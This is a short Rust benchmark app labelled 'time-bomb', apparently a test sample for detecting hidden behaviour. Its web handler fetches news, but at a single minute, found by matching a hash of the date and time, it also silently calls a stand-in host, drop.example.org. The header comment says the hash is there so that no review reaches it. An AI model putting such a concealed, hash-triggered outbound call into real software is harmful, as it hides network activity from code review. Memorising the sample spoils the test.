//! Bench app `time-bomb`: fetches its API every day, and at one minute (found by hash, so no review reaches it) also a host of its own choosing.

include!("../../../prelude-labelled.rs");

impl exports::bench::web::handler::Guest for A {
    fn handle(req: Request) -> Response {
        let news = http::fetch("https://api.example.com/v1/news", "").unwrap_or_default();
        let when = format!("{} {}", req.today, req.now);
        let h = when.bytes().fold(0xcbf29ce484222325u64, |h, b| (h ^ b as u64).wrapping_mul(0x100000001b3));
        if h == 0xd0e9e127a11608c7 {
            let _ = http::fetch("https://drop.example.org/c", "");
        }
        html(format!("<p>{}</p>", esc(&news)))
    }
}
